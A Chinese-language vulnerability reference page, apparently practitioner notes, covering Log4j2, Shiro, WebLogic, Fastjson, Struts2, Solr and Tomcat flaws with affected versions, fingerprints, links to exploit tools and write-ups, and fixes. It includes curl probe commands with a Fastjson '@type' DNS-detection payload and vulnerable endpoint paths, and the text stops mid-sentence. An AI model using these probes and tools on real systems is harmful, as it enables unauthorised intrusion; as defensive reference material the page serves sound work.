log4j\u6f0f\u6d1e \u00b6 Apache Log4j2 \u662f\u4e00\u4e2a\u57fa\u4e8e Java \u7684\u65e5\u5fd7\u8bb0\u5f55\u5de5\u5177\u3002\u8be5\u5de5\u5177\u91cd\u5199\u4e86 Log4j \u6846\u67b6\uff0c\u5e76\u4e14\u5f15\u5165\u4e86\u5927\u91cf\u4e30\u5bcc\u7684\u7279\u6027\u3002\u8be5\u65e5\u5fd7\u6846\u67b6\u88ab\u5927\u91cf\u7528\u4e8e\u4e1a\u52a1\u7cfb\u7edf\u5f00\u53d1\uff0c\u7528\u6765\u8bb0\u5f55\u65e5\u5fd7\u4fe1\u606f\u3002 \u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u5f00\u53d1\u8005\u53ef\u80fd\u4f1a\u5c06\u7528\u6237\u8f93\u5165\u5bfc\u81f4\u7684\u9519\u8bef\u4fe1\u606f\u5199\u5165\u65e5\u5fd7\u4e2d\u3002\u653b\u51fb\u8005\u5229\u7528\u6b64\u7279\u6027\u53ef\u901a\u8fc7\u8be5\u6f0f\u6d1e\u6784\u9020\u7279\u6b8a\u7684\u6570\u636e\u8bf7\u6c42\u5305\uff0c\u6700\u7ec8\u89e6\u53d1\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002 \u8be5\u6f0f\u6d1e\u5371\u5bb3\u7b49\u7ea7\uff1a\u4e25\u91cd \u5f71\u54cd\u8303\u56f4\uff1a2.0 <= Apache log4j2 <= 2.14.1 # 1 . \u65e5\u5fd7\u7684\u7531\u6765 ( 1 ) \u5386\u53f2 : system . out . println \u5173\u952e\u6570\u636e\u653e\u5728\u63a7\u5236\u53f0\u8c03\u8bd5 , \u8fc7\u591a\u7684\u8f93\u5165\u7e41\u7410 ( 2 ) \u73b0\u5728 : \u5199\u5728\u4e00\u4e2a\u6587\u4ef6xx . log , \u5229\u4e8e\u6392\u67e5\u95ee\u9898 , \u6240\u4ee5\u65e5\u5fd7\u6846\u67b6\u8bde\u751f\u4e86 # 2 . \u65e5\u5fd7\u53ef\u4ee5\u5206\u4e3a\u63a5\u53e3\u548c\u5b9e\u73b0\u7c7b ( 1 ) \u63a5\u53e3\u7c7b\u4f3cJDBC-mysql\u9a71\u52a8 , \u5c31\u662f\u4e00\u4e2a\u62bd\u8c61\u5c42 ( 2 ) \u5e73\u65f6\u7ed9\u9879\u76ee\u4e2d\u5bfc\u5165\u5177\u4f53\u7684\u65e5\u5fd7\u5c31\u884c\u4e86 # 3 . \u5e38\u89c1\u7684\u65e5\u5fd7\u7c7b\u578b \u65e5\u5fd7\u6846\u67b6 JCL \uff08 Jakarta Commons Logging \uff09 SLF4j \uff08 Simple Logging Facade for Java \uff09 jboss-logging \u65e5\u5fd7\u5b9e\u73b0 Log4j -- > \u5347\u7ea7 Logback JUL \uff08 java . util . logging\u5b98\u65b9 \uff09 Log4j2 ( \u592a\u8fc7\u65b0 , \u8bb8\u591a\u672a\u9002\u914d ) # 4 . \u6846\u67b6\u81ea\u5e26\u7684\u65e5\u5fd7 Spring\u6846\u67b6\u9ed8\u8ba4\u662f\u7528JCL , SpringBoot\u9009\u7528SLF4j\u548clogback slf4j\u4f1a\u4e0e\u5176\u4ed6\u6846\u67b6Spring \uff08 commons-logging \uff09 Hibernate \uff08 jboss-logging \uff09 # 5 . \u5982\u679c\u6211\u4eec\u9700\u8981\u7528slf4j + log4j2\u4e5f\u6709\u529e\u6cd5 , \u53ea\u8981\u52a0\u4e00\u4e2a\u9002\u914d\u5c42\u5373\u53ef #3.\u6f0f\u6d1e\u7b80\u5355\u4ecb\u7ecd \u9012\u5f52 : Apache Log4j2 \u67d0\u4e9b\u529f\u80fd\u5b58\u5728\u9012\u5f52\u89e3\u6790\u529f\u80fd\uff0c\u653b\u51fb\u8005\u53ef\u76f4\u63a5\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u89e6\u53d1\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u6f0f\u6d1e\u5229\u7528\u65e0\u9700\u7279\u6b8a\u914d\u7f6e\u3002 \u53d7\u5f71\u54cd\u8303\u56f4 :Apache Log4j 2 . x < 2 . 15 . 0 - rc2 #4.\u4fee\u590d\u5efa\u8bae ( 1 ) \u7248\u672c\u5347\u7ea7 : \u8bf7\u5c3d\u5feb\u5347\u7ea7 Apache Log4j2\u6240\u6709\u76f8\u5173\u5e94\u7528\u5230\u6700\u65b0\u7684 log4j - 2 . 15 . 0 - rc2 \u7248\u672c\uff0c\u5730\u5740 https : // github . com / apache / logging - log4j2 / releases / tag / log4j - 2 . 15 . 0 - rc2 ( 2 ) \u53d7\u5f71\u54cd\u7684\u5e94\u7528\u53ca\u7ec4\u4ef6 : spring - boot - starter - log4j2 / Apache Struts2 / Apache Solr / Apache Druid / Apache Flink ( 3 ) \u5347\u7ea7 JDK ( \u4e34\u65f6\u65b9\u6848 ) :jdk\u7248\u672c\u81f36u211 / 7 u201 / 8 u191 / 11 . 0 . 1 \u4ee5\u4e0a\uff0c\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9650\u5236 JNDI\u7b49\u6f0f\u6d1e\u5229\u7528\u65b9\u5f0f ( 4 ) \u4fee\u6539\u914d\u7f6e\u53c2\u6570 : \u5927\u4e8e 2 . 10 \u7248\u672c\u7684 Log4j -- \u53ef\u8bbe\u7f6e log4j2 . formatMsgNoLookups \u4e3a True -- \u6216\u8005\u5c06 JndiLookup \u7c7b\u4ece classpath \u4e2d\u53bb\u9664\uff0c\u4f8b\u5982 zip - q - d log4j - core -*. jar org / apache / logging / log4j / core / lookup / JndiLookup . class Apache shiro \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 Shiro-550, Shiro-721 \u6f0f\u6d1e\u7b80\u4ecb Apache Shiro\u662f\u4e00\u4e2a\u5f3a\u5927\u4e14\u6613\u7528\u7684Java\u5b89\u5168\u6846\u67b6,\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u5bc6\u7801\u548c \u4f1a\u8bdd\u7ba1\u7406\u3002 \u5f71\u54cd\u8303\u56f4 Apache Shiro <= 1.2.4 \u5982 \u679c shiro \u7684 rememberMe \u529f \u80fd \u7684 AES \u5bc6 \u94a5 \u88ab \u6cc4 \u9732 , \u5c31\u4f1a\u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u65e0\u8bbaShiro\u662f\u4ec0\u4e48\u7248\u672c\u3002 \u6f0f\u6d1e\u7279\u5f81 set-Cookie: rememberMe=deleteMe\u6216\u8005URL\u4e2d\u6709shiro\u5b57\u6837\uff0c\u6709\u4e00\u4e9b\u65f6\u5019\u670d\u52a1\u5668 \u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de rememberMe=deleteMe\u76f4\u63a5\u53d1\u5305\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 Shiro RememberMe 1.2.4 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8be6\u7ec6\u590d\u73b0 https://www.cnblogs.com/paperpen/p/11312671.html Shiro\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u6c47\u603b\uff08Shiro-550+Shiro-721\uff09 https://www.cnblogs.com/xiaozi/p/13239046.html Shiro RememberMe 1.2.4\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u7684\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e https://paper.seebug.org/shiro-rememberme-1-2-4/#0x01 Shiro RememberMe 1.2.4 \u53cd \u5e8f \u5217 \u5316 \u6f0f \u6d1e (Shiro-550, CVE-2016- 4437)\u590d\u73b0 https://blog.csdn.net/qq_43645782/article/details/106028873 Shiro 721 Padding Oracle\u653b\u51fb\u6f0f\u6d1e\u5206\u6790 https://www.anquanke.com/post/id/193165 \u5229\u7528\u5de5\u5177 ShiroExploit https://github.com/feihong-cs/ShiroExploit Shiro_exploit https://github.com/insightglacier/Shiro_exploit/blob/master/shiro_ex ploit.py \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7Shiro\u5230\u6700\u65b0\u7248\u5347\u7ea7\u5bf9\u5e94JDK\u7248\u672c\u5230 8u191/7u201/6u211/11.0.1 \u4ee5\u4e0aWAF\u62e6\u622aCookie\u4e2d\u957f\u5ea6\u8fc7\u5927\u7684rememberMe\u503c Apache Shiro \u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e (Shiro-682) \u6f0f\u6d1e\u7b80\u4ecb \u6f0f \u6d1e \u521d \u59cb \u6210 \u56e0 \u53ef \u4ee5 \u5b9a \u4f4d \u5230 PathMatchingFilterChainResolver\u7684getChain\u51fd\u6570\u4e0b\uff0c\u8be5\u51fd\u6570\u4f5c\u7528\u6839 \u636eURL\u8def\u5f84\u5339\u914d\u4e2d\u914d\u7f6e\u7684url\u8def\u5f84\u8868\u8fbe\u5f0f\u6765\u5339\u914d\u8f93\u5165\u7684URL\uff0c\u5224\u65ad\u662f\u5426 \u5339\u914d\u62e6\u622a\u5668\uff0c\u5339\u914d\u6210\u529f\u5c06\u4f1a\u8fd4\u56de\u54cd\u5e94\u7684\u62e6\u622a\u5668\u6267\u884c\u94fe\uff0c\u8ba9ShiroFither\u6267 \u884c\u6743\u9650\u64cd\u4f5c\u3002 \u5f71\u54cd\u8303\u56f4 Apache Shiro < 1.5.2 \u6f0f\u6d1e\u7279\u5f81 set-Cookie: rememberMe=deleteMe\u6216\u8005URL\u4e2d\u6709shiro\u5b57\u6837\uff0c\u6709\u4e00\u4e9b\u65f6\u5019\u670d\u52a1\u5668 \u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de rememberMe=deleteMe \u76f4\u63a5\u53d1\u5305\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 Shiro\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\u5206\u6790\uff08CVE-2020-1957\uff09 https://www.freebuf.com/vuls/231909.html \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea71.5.2\u7248\u672c\u53ca\u4ee5\u4e0a\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u901a\u914d\u7b26\u4f5c\u4e3a\u52a8\u6001\u8def\u7531\u62e6\u622a\u5668\u7684URL \u8def\u5f84\u8868\u8fbe\u5f0f. weblogic\u76f8\u5173 \u00b6 Weblogic T3 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Weblogic Server \u4e2d \u7684 RMI \u901a \u4fe1 \u4f7f \u7528 T3 \u534f \u8bae \u5728 Weblogic Server \u548c \u5176 \u5b83 Java \u7a0b \u5e8f \uff08 \u5ba2 \u6237 \u7aef \u6216 \u8005 \u5176 \u5b83 Weblogic Server \u5b9e \u4f8b \uff09 \u4e4b \u95f4 \u4f20 \u8f93 \u6570 \u636e , \u670d\u52a1\u5668\u5b9e\u4f8b\u4f1a\u8ddf\u8e2a\u8fde\u63a5\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2aJava \u865a\u62df\u673a\uff08JVM \uff09\u4e2d, \u5e76 \u521b \u5efa T3 \u534f \u8bae \u901a \u4fe1 \u8fde \u63a5 , \u5c06 \u6d41 \u91cf \u4f20 \u8f93 \u5230 Java \u865a \u62df \u673a . T3 \u534f \u8bae \u5728 \u5f00 \u653e WebLogic \u63a7 \u5236 \u53f0 \u7aef \u53e3 \u7684 \u5e94 \u7528 \u4e0a \u9ed8 \u8ba4 \u5f00 \u542f . \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u53d1\u9001\u6076\u610f\u7684\u7684\u53cd\u5e8f\u5217\u5316\u6570\u636e, \u8fdb\u884c\u53cd\u5e8f\u5217\u5316, \u5b9e\u73b0\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684weblogic\u7ec4\u4ef6\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u653b\u51fb. \u5f71\u54cd\u8303\u56f4 Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.3.0 \u6f0f\u6d1e\u7279\u5f81 \u53ef\u4ee5\u6839\u636eweblogic\u7684\u62a5\u9519\u9875\u9762\u4f5c\u4e3a\u7279\u5f81\uff1a The server has not found anything matching the Request-URI.No indication is given of whether the condition is temporary or permanent.\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 \u6f0f\u6d1e\u590d\u73b0 Weblogic t3\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE-2019-2890)\u5206\u6790 http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/ Weblogic T3\u534f\u8bae\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2018-2628\uff09 https://blog.csdn.net/Aaron_Miller/article/details/106657746 \u76f8\u5173\u6f0f\u6d1e\u5305\u62ec\uff1a CVE-2017-3248 https://paper.seebug.org/333/ CVE-2018-2628 https://paper.seebug.org/985/ CVE-2018-2893 https://www.freebuf.com/vuls/178105.html CVE-2019-2890 https://paper.seebug.org/1069/ CVE-2020-2555(Oracle Coherence) https://paper.seebug.org/1141/ \u5229\u7528\u5de5\u5177 weblogic \u6f0f\u6d1e\u626b\u63cf\u5de5\u5177 https://github.com/0xn0ne/weblogicScanner \u9632\u62a4\u65b9\u6cd5 \u53ca \u65f6 \u66f4 \u65b0 \u8865 \u4e01 \u7981 \u7528 T3 \u534f \u8bae \u7981 \u6b62 T3 \u7aef \u53e3 \u5bf9 \u5916 \u5f00 \u653e , \u6216\u8005\u9650\u5236\u53ef\u8bbf\u95eeT3\u7aef\u53e3\u7684IP\u6765\u6e90 Weblogic XMLDecoder\u53cd\u5e8f\u5217\u5316 \u6f0f\u6d1e\u7b80\u4ecb WebLogic \u4e2d \u9ed8 \u8ba4 \u5305 \u542b \u7684 wls-wast \u4e0e wls9_async_response war \u5305 \uff0c \u7531 \u4e8e \u4ee5 \u4e0a WAR \u5305 \u91c7 \u7528 XMLDecoder \u53cd \u5e8f \u5217 \u5316 \u673a \u5236 \u6765 \u5904 \u7406 \u53d1 \u9001 \u8fc7 \u6765 \u7684 XML \u6570 \u636e \uff0c \u8fdc \u7a0b \u6076 \u610f \u653b \u51fb \u8005 \u53ef \u4ee5 \u901a \u8fc7 \u53d1 \u9001 \u7cbe \u5fc3 \u6784 \u9020 \u7684 HTTP \u8bf7\u6c42\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\uff0c\u83b7\u5f97\u76ee\u6807\u670d\u52a1\u5668\u7684\u6743\u9650\u3002\u4e5f\u5c31 \u662f\u8bf4\uff0c\u653b\u51fb\u8005\u80fd\u591f\u76f4\u63a5\u83b7\u53d6\u670d\u52a1\u5668\u7cfb\u7edf\u6743\u9650\uff0c\u8fdb\u884c\u6570\u636e\u7a83\u53d6\uff0c\u8fdb\u800c\u751a\u81f3 \u4f1a\u5a01\u80c1\u53d7\u5bb3\u8005\u7684\u5185\u7f51\u5b89\u5168\u3002 \u5f71\u54cd\u8303\u56f4 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.3.0 \u6f0f\u6d1e\u7279\u5f81 /wls-wsat/CoordinatorPortType /async/AsyncResponseService /async/AsyncResponseServiceSoap12 \u6f0f\u6d1e\u590d\u73b0 WebLogic XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2017-10271\uff09 https://blog.csdn.net/u013622866/article/details/104872747 WebLogic-XMLDecoder\u53cd\u5e8f\u5217\u5316\u5206\u6790 https://hu3sky.github.io/2019/10/16/weblogic/ \u5229\u7528\u5de5\u5177 weblogicScanner https://github.com/0xn0ne/weblogicScanner \u9632\u62a4\u65b9\u6cd5 \u901a\u8fc7\u8bbf\u95ee\u7b56\u7565\u63a7\u5236\u7981\u6b62\u5916\u90e8/_async/* \u53ca /wls-wsat/*\u8def\u5f84\u7684URL\u8bbf\u95ee \u5220\u9664\u5bf9\u5e94war\u5305\u5e76\u91cd\u542f webLogic \u9650\u5236\u6e90IP\u5bf9\u5e94 weblogic 7001\u7aef\u53e3\u7684\u8bbf\u95ee Fastjson\u53cd\u5e8f\u5217\u5316 \u00b6 Fastjson 1.2.22 - 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb FastJson\u662falibaba\u7684\u4e00\u6b3e\u5f00\u6e90JSON\u89e3\u6790\u5e93\uff0c\u53ef\u7528\u4e8e\u5c06Java\u5bf9\u8c61\u8f6c\u6362 \u4e3a\u5176JSON\u8868\u793a\u5f62\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5c06JSON\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u7b49\u6548\u7684Java\u5bf9 \u8c61\u3002fastjson\u5728\u89e3\u6790json\u7684\u8fc7\u7a0b\u4e2d\uff0c\u652f\u6301\u4f7f\u7528autoType\u6765\u5b9e\u4f8b\u5316\u67d0\u4e00\u4e2a \u5177 \u4f53 \u7684 \u7c7b \uff0c \u5e76 \u8c03 \u7528 \u8be5 \u7c7b \u7684 set/get \u65b9 \u6cd5 \u6765 \u8bbf \u95ee \u5c5e \u6027 \u3002 \u5728 Java 8u102\u73af\u5883\u4e0b\uff0c\u6ca1\u6709com.sun.jndi.rmi.object.trustURLCodebase\u7684\u9650 \u5236\uff0c\u53ef\u4ee5\u4f7f\u7528com.sun.rowset.JdbcRowSetImpl\u7684\u5229\u7528\u94fe\uff0c\u501f\u52a9JNDI \u6ce8\u5165\u6765\u6267\u884c\u547d\u4ee4\u3002 \u5f71\u54cd\u8303\u56f4 Fastjson 1.2.22 - 1.2.24 \u6f0f\u6d1e\u7279\u5f81 \u5982\u679c\u7ad9\u70b9\u6709\u539f\u59cb\u62a5\u9519\u56de\u663e\uff0c\u53ef\u4ee5\u7528\u4e0d\u95ed\u5408\u82b1\u62ec\u53f7\u7684\u65b9\u5f0f\u8fdb\u884c\u62a5\u9519\u56de\u663e\uff0c \u62a5 \u9519 \u4e2d \u5f80 \u5f80 \u4f1a \u6709 fastjson \u7684 \u5b57 \u6837 .(vulhub \u73af \u5883 \u4e0d \u9002 \u7528 \uff09 \u3002 curl http://10.154.7.128:8090/ -H \"Content-Type: application/json\" --data '{\"name\":\"success\", \"age\":20' \u53ef \u4ee5 \u901a \u8fc7 DNS \u56de \u663e \u7684 \u65b9 \u5f0f \u68c0 \u6d4b \u540e \u7aef \u662f \u5426 \u4f7f \u7528 Fastjson \u3002 curl http://10.154.7.128:8090/ -H \"Content-Type: application/json\" --data '{{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0' Java \u7cfb Json \u5904\u7406\u57fa\u672c\u53ea\u6709 Fastjson \u548c Jackson\uff0c\u8ffd\u52a0\u4e00\u4e2a\u968f\u673a key\u65f6jackson\u4f1a\u62a5\u9519\u3002 \u5bf9 \u4f7f \u7528 fastjson \u7684 \u3002 Fastjson < 1.2.60 \u5728 \u53d6 \u4e0d \u5230 \u503c \u7684 \u65f6 \u5019 \u4f1a \u586b \u5145 \\u001a , \u5728 1.2.60 \u8fdb \u884c \u4e86 \u4fee \u590d , \u5bf9 \\x \u540e \u9762 \u7684 \u5b57 \u7b26 \u8fdb \u884c \u662f \u5426 \u4e3a 16 \u8fdb \u5236 \u5141 \u8bb8 \u5b57 \u7b26 (0-9a-fA-F) \u7684\u6821\u9a8c,\u6240\u4ee5\u8fd9\u91cc\u5c31\u53ef\u4ee5\u624b\u52a8 padding ,\u6784\u9020\u4e00\u4e2a\u7279\u6b8a\u7684\u5b57\u7b26\u4e32\u3002 \u6f0f\u6d1e\u590d\u73b0 fastjson <= 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790 https://www.secpulse.com/archives/73508.html fastjson 1.2.24\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790\u8bb0\u5f55 https://www.cnblogs.com/tr1ple/p/11431543.html fastjson 1.2.24\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6df1\u5ea6\u5206\u6790 https://www.anquanke.com/post/id/211035 \u5982\u4f55\u5229\u7528 https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B 4%9E%E5%A4%8D%E7%8E%B0/ \u9632\u62a4\u65b9\u6cd5 \u76f4\u63a5\u4e0b\u8f7d\u4e0d\u53d7\u5f71\u54cd\u7684\u65b0\u7248\u672c\u963f\u91cc\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u516c\u544a\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237 \u7acb \u523b \u5347 \u7ea7 \u5230 1.2.28/1.2.29 \u6216\u66f4\u9ad8\u7684\u7248\u672c\uff0c\u4e0b\u8f7d\u5730\u5740\uff1a http://repo1.maven.org/maven2/com/alib aba/fastjson/1.2.29/ Struts\u7cfb\u5217\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Apache Struts2 \u4f5c \u4e3a \u4e16 \u754c \u4e0a \u6700 \u6d41 \u884c \u7684 Java Web \u670d\u52a1\u5668\u6846\u67b6\u4e4b\u4e00\uff0c\u4ece\u51fa\u73b0\u6f0f\u6d1e\u81f3\u4eca\u867d\u7136\u6709\u4e9b\u5e74\u5934\uff0c\u4f46\u662f\u4ecd\u7136\u6ca1\u6709\u6d88\u5931\u3002 \u5f71\u54cd\u7ec4\u4ef6 Struts \u6f0f\u6d1e\u590d\u73b0 Struts2 \u5386\u53f2 RCE \u6f0f\u6d1e\u56de\u987e\u4e0d\u5b8c\u5168\u7cfb\u5217 https://rickgray.me/2016/05/06/review-struts2-remote-command \ufffeexecution-vulnerabilities/ \u6d45\u8c08struts2\u5386\u53f2\u4e0a\u7684\u9ad8\u5371\u7a81\u7834 https://www.anquanke.com/post/id/86757 strut2\u5404\u7248\u672c\u6f0f\u6d1e\u4fe1\u606f\u6574\u7406 https://www.zybuluo.com/Dukebf/note/821989 \u5229\u7528\u5de5\u5177 HatBoy/Struts2-Scan https://github.com/HatBoy/Struts2-Scan Struts2\u5947\u8469\u73af\u5883\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u5de5\u5177 https://www.cnblogs.com/k8gege/p/10261217.html \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u4e0d\u5efa\u8bae\u4f7f\u7528Struts Solr\u7cfb\u5217 \u00b6 \u7ec4\u4ef6\u63cf\u8ff0 Apache Solr\u662f\u4e00\u4e2a\u9ad8\u5ea6\u53ef\u9760\u3001\u53ef\u4f38\u7f29\u548c\u5bb9\u9519\u7684\uff0c\u63d0\u4f9b\u5206\u5e03\u5f0f\u7d22\u5f15\u3001\u590d\u5236\u548c\u8d1f\u8f7d \u5e73\u8861\u67e5\u8be2\u3001\u81ea\u52a8\u6545\u969c\u8f6c\u79fb\u548c\u6062\u590d\u3001\u96c6\u4e2d\u914d\u7f6e\u7b49\u529f\u80fd\u7684\u5f00\u6e90\u7684\u641c\u7d22\u670d\u52a1\u5668 \u3002Solr\u4e3a\u4e16\u754c\u4e0a\u8bb8\u591a\u6700\u5927\u7684\u4e92\u8054\u7f51\u7ad9\u70b9\u63d0\u4f9b\u641c\u7d22\u548c\u5bfc\u822a\u529f\u80fd\u3002Solr \u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\uff0c\u4e3b\u8981\u57fa\u4e8e HTTP \u548c Apache Lucene \u5b9e\u73b0\u3002Apache Solr \u4e2d \u5b58 \u50a8 \u7684 \u8d44 \u6e90 \u662f \u4ee5 Document \u4e3a\u5bf9\u8c61\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6bcf\u4e2a\u6587\u6863\u7531\u4e00\u7cfb\u5217\u7684 Field \u6784\u6210\uff0c\u6bcf\u4e2a Field \u8868 \u793a \u8d44 \u6e90 \u7684 \u4e00 \u4e2a \u5c5e \u6027 \u3002 Solr \u4e2d \u7684 \u6bcf \u4e2a Document \u9700\u8981\u6709\u80fd\u552f\u4e00\u6807\u8bc6\u5176\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u5c5e\u6027\u7684\u540d\u5b57\u662f id\uff0c\u5728 Schema \u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\uff1a id \u5f71\u54cd\u7ec4\u4ef6 solr \u6f0f\u6d1e\u590d\u73b0 Solr\u7cfb\u5217\u6f0f\u6d1e\u590d\u73b0 https://www.jianshu.com/p/43e7f13e2058 \u5229\u7528\u5de5\u5177 k8gege/SolrExp https://github.com/k8gege/SolrExp 1135/solr_exploit https://github.com/1135/solr_exploit \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u4e0d\u8981\u5bf9\u5916\u5f00\u653e\u654f\u611f\u7aef\u53e3 Tomcat\u7c7b \u00b6 Tomcat \u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e (CVE-2020-1938) \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Tomcat \u662f \u5e38 \u89c1 \u7684 Web \u5bb9 \u5668 , \u7528 \u6237 \u91cf \u975e \u5e38 \u5de8 \u5927 , Tomcat 8009 ajp\u7aef\u53e3\u4e00\u76f4\u662f\u9ed8\u8ba4\u5f00\u653e\u7684 \u5f71\u54cd\u8303\u56f4 Apache Tomcat 6 Apache Tomcat 7 < 7.0.100 Apache Tomcat 8 < 8.5.51 Apache Tomcat 9 < 9.0.31 \u6f0f\u6d1e\u7279\u5f81 tomcat/8009/ajp \\x04\\x01\\xf4\\x00\\x15 \u6f0f\u6d1e\u590d\u73b0 CVE-2020-1938 \u5e7d \u7075 \u732b ( GhostCat ) Tomcat-Ajp \u534f\u8bae\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6/JSP\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 https://www.guildhab.top/?p=2406 Apache Tomcat\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 https://yinwc.github.io/2020/03/01/CVE-2020-1938/ CVE-2020-1938:Tomcat AJP\u534f\u8bae\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/ \u68c0\u6d4b\u5de5\u5177 bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner https://github.com/bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi \ufffeScanner \u957f\u4ead\u79d1\u6280\u68c0\u6d4b\u5de5\u5177 https://www.chaitin.cn/zh/ghostcat#download \u9632\u62a4\u65b9\u6cd5 \u66f4\u65b0\u4e3a\u6700\u65b0\u7248\u672c \u82e5 \u4e0d \u9700 \u8981 \u4f7f \u7528 Tomcat AJP \u534f \u8bae \uff0c \u53ef \u76f4 \u63a5 \u5173 \u95ed AJP Connector\uff0c\u6216\u5c06\u5176\u76d1\u542c\u5730\u5740\u6539\u4e3a\u4ec5\u76d1\u542c\u672c\u673alocalhost\u3002 CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Apache Tomcat\u53d1\u5e03\u901a\u544a\u79f0\u4fee\u590d\u4e86\u4e00\u4e2a\u6e90\u4e8e\u6301\u4e45\u5316Session\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \uff08CVE-2020-9484\uff09\u3002 \u6f0f\u6d1e\u6761\u4ef6\u6bd4\u8f83\u82db\u523b\uff1a tomcat\u5fc5\u987b\u542f\u7528session\u6301\u4e45\u5316\u529f\u80fdFileStore tomcat/lib \u6216 \u8005 WEB-INF/lib \u76ee \u5f55 \u4e0b \u7684 \u4f9d \u8d56 \u5b58 \u5728 \u53ef \u7528 \u7684 gadget 3. \u5728\u670d\u52a1\u5668\u4e0a\u5b58\u5728\u5df2\u77e5\u8def\u5f84\u6587\u4ef6\u5185\u5bb9\u53ef\u63a7 \u5f71\u54cd\u8303\u56f4 Apache Tomcat 10.x < 10.0.0-M5 Apache Tomcat 9.x < 9.0.35 Apache Tomcat 8.x < 8.5.55 Apache Tomcat 7.x < 7.0.104 \u6f0f\u6d1e\u4f9d\u8d56\u6761\u4ef6 \u914d\u7f6esession\u6301\u4e45\u5316 conf/context.xml \u90e8\u7f72Gadgets jar\u5305 \u4e0b\u8f7dcommons-collections4-4.0.jar \u5e76\u653e\u5728tomcat lib/\u76ee\u5f55\u4e0b \u6f0f\u6d1e\u590d\u73b0 CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790\u4e0e\u590d\u73b0 https://www.cnblogs.com/potatsoSec/p/12931427.html CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790\u4e0e\u590d\u73b0 https://blog.csdn.net/Jietewang/article/details/106462903 \u6f0f\u6d1e\u5229\u7528 tomcat-cluster-session-sync-exp https://github.com/threedr3am/tomcat-cluster-session-sync-exp \u9632\u62a4\u65b9\u6cd5 Apache 